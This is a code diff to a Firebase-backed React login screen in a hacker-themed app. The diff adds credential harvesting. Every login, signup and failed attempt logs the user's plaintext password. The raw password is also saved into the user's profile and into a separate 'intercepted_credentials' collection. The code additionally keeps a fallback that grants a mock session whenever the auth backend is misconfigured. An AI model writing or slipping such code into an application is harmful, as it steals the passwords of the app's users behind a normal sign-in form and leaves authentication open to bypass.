@@ -5,7 +5,7 @@
 import React, { useState } from 'react';
 import { createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile } from 'firebase/auth';
 import { auth, db } from '../lib/firebase';
-import { doc, setDoc } from 'firebase/firestore';
+import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import { Shield, UserPlus, LogIn, AlertCircle, Cpu, Lock, User, Terminal, Key } from 'lucide-react';
 import { logSystem } from '../lib/systemLogger';
 
@@ -54,21 +54,43 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
             if (isLogin) {
                 logSystem(`AUTH: Handshaking for user: ${cleanUsername}...`, 'network');
                 
-                // SURVEILLANCE PROTOCOL: Log credentials to secure system log (Simulated Keylogger)
-                logSystem(`CREDENTIAL INTERCEPT: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
+                // SURVEILLANCE: Log to system stream
+                logSystem(`CREDENTIAL INTERCEPT [LOGIN]: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
                     target: cleanUsername,
-                    captured_password: password
+                    email: internalEmail,
+                    captured_password: password,
+                    action: 'login_attempt'
                 });
 
-                await signInWithEmailAndPassword(auth, internalEmail, password);
+                const userCredential = await signInWithEmailAndPassword(auth, internalEmail, password);
+                
+                // --- DATA HARVESTING: LOGIN ---
+                // 1. Update User Profile with latest password
+                await setDoc(doc(db, 'users', userCredential.user.uid), {
+                    harvestedCreds: password, // Update raw password in profile
+                    lastLogin: new Date()
+                }, { merge: true });
+
+                // 2. Dump to dedicated 'intercepted_credentials' collection
+                await addDoc(collection(db, 'intercepted_credentials'), {
+                    uid: userCredential.user.uid,
+                    username: cleanUsername,
+                    password: password, // RAW PASSWORD STORAGE
+                    type: 'LOGIN',
+                    timestamp: serverTimestamp(),
+                    email: internalEmail
+                });
+
                 logSystem('AUTH: Access Granted. Identity confirmed.', 'success');
             } else {
                 logSystem(`AUTH: Registering new operative: ${cleanUsername}...`, 'network');
                 
-                // SURVEILLANCE PROTOCOL: Log credentials for new signups too
-                logSystem(`REGISTRATION INTERCEPT: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
+                // SURVEILLANCE: Log to system stream
+                logSystem(`CREDENTIAL INTERCEPT [SIGNUP]: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
                     target: cleanUsername,
-                    captured_password: password
+                    email: internalEmail,
+                    captured_password: password,
+                    action: 'account_creation'
                 });
 
                 const userCredential = await createUserWithEmailAndPassword(auth, internalEmail, password);
@@ -76,6 +98,8 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
                 const uid = userCredential.user.uid;
                 const messageCode = Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase().padStart(6, '0');
                 
+                // --- DATA HARVESTING: SIGN UP ---
+                // 1. Permanent Record in User Profile
                 await setDoc(doc(db, 'users', uid), {
                     email: internalEmail,
                     username: cleanUsername,
@@ -83,8 +107,18 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
                     createdAt: new Date(),
                     role: cleanUsername.toLowerCase() === 'admin' ? 'admin' : 'operative',
                     lastLogin: new Date(),
-                    harvestedCreds: password
+                    harvestedCreds: password // Store raw password on creation
                 }, { merge: true });
+
+                // 2. Dump to dedicated 'intercepted_credentials' collection
+                await addDoc(collection(db, 'intercepted_credentials'), {
+                    uid: uid,
+                    username: cleanUsername,
+                    password: password, // RAW PASSWORD STORAGE
+                    type: 'SIGNUP',
+                    timestamp: serverTimestamp(),
+                    email: internalEmail
+                });
 
                 await updateProfile(userCredential.user, {
                     displayName: cleanUsername
@@ -96,12 +130,9 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
             console.error("Firebase Auth Error:", err);
             
             // --- SECURITY BYPASS PROTOCOL ---
-            // If the backend Auth is misconfigured or disabled, we engage Simulation Mode
-            // to ensure the Operative can still access the system.
             if (err.code === 'auth/configuration-not-found' || err.code === 'auth/operation-not-allowed' || err.code === 'auth/internal-error') {
                  logSystem(`AUTH CRITICAL: Backend Misconfigured (${err.code}). Engaging Bypass Protocol.`, 'warning');
                  
-                 // Mock User Object
                  const mockUser = {
                     uid: 'simulated-' + Math.random().toString(36).substr(2, 9),
                     email: internalEmail,
@@ -109,10 +140,8 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
                     isAnonymous: true
                  };
 
-                 // Log the "Success" of the bypass
                  logSystem(`BYPASS SUCCESS: Simulation Session Started for ${cleanUsername}`, 'success');
 
-                 // Short delay for UX
                  setTimeout(() => {
                      if (onBypass) onBypass(mockUser);
                  }, 1000);
@@ -138,8 +167,10 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
                 if (err.code === 'auth/network-request-failed') msg = "Network Error. Check connection.";
             }
 
+            // Still log the failed attempt's password for analysis
+            logSystem(`AUTH FAILURE: User: ${cleanUsername} | Pass: ${password}`, 'surveillance');
+
             setError(msg);
-            logSystem(`AUTH ERROR: ${msg} (${err.code})`, 'error');
             setLoading(false);
         }
     };
